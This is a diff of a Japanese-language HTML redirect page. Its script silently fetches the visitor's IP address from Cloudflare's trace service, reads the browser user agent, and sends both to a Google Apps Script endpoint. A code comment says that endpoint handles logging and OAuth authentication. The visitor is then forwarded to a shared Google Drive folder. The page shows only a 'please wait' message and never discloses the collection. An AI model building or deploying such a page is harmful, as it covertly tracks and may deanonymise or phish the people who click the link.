@@ -2,31 +2,31 @@
 <html>
   <head>
     <meta charset="UTF-8" />
-    <title>Redirecting...</title>
+    <title>アクセス中...</title>
     <style>
       body {
-        background-color: #111;
-        color: #fff;
-        font-family: sans-serif;
+        background: #121212;
+        color: white;
         text-align: center;
         padding-top: 20%;
+        font-family: sans-serif;
       }
     </style>
   </head>
   <body>
-    <p>リダイレクト中です。しばらくお待ちください...</p>
+    <p>少しお待ちください</p>
     <script>
       async function logAndRedirect() {
         try {
           const res = await fetch("https://www.cloudflare.com/cdn-cgi/trace");
           const txt = await res.text();
-          const ipMatch = txt.match(/ip=(.+)/);
-          const ip = ipMatch ? ipMatch[1].trim() : "未取得";
+          const ip = txt.match(/ip=(.+)/)?.[1]?.trim() || "未取得";
           const ua = navigator.userAgent;
 
           const id = "cdef-8765-21-0987-h";
           const nextURL = "https://drive.google.com/drive/folders/1BLJp9l7lsTLOfWtiLvgoJBr4LkmrcUBq?usp=sharing";
 
+          // GAS（ログ保存＋OAuth認証＋リダイレクト処理を含む）
           const redirectURL =
             "https://script.google.com/macros/s/AKfycbz6LVV3xSOaXrXf6QU9FqlPktIo_3bQO1sptai6En7f20gqHWJQBiAiYFT-NpihpxTtXg/exec" +
             "?id=" + encodeURIComponent(id) +
@@ -36,7 +36,7 @@
 
           window.location.href = redirectURL;
         } catch (e) {
-          document.body.innerHTML = "<p>IP取得に失敗しました。もう一度お試しください。</p>";
+          document.body.innerHTML = "<p>エラーが発生しました。再読み込みしてください。</p>";
           console.error("IP取得失敗:", e);
         }
       }
@@ -45,3 +45,4 @@
     </script>
   </body>
 </html>
+
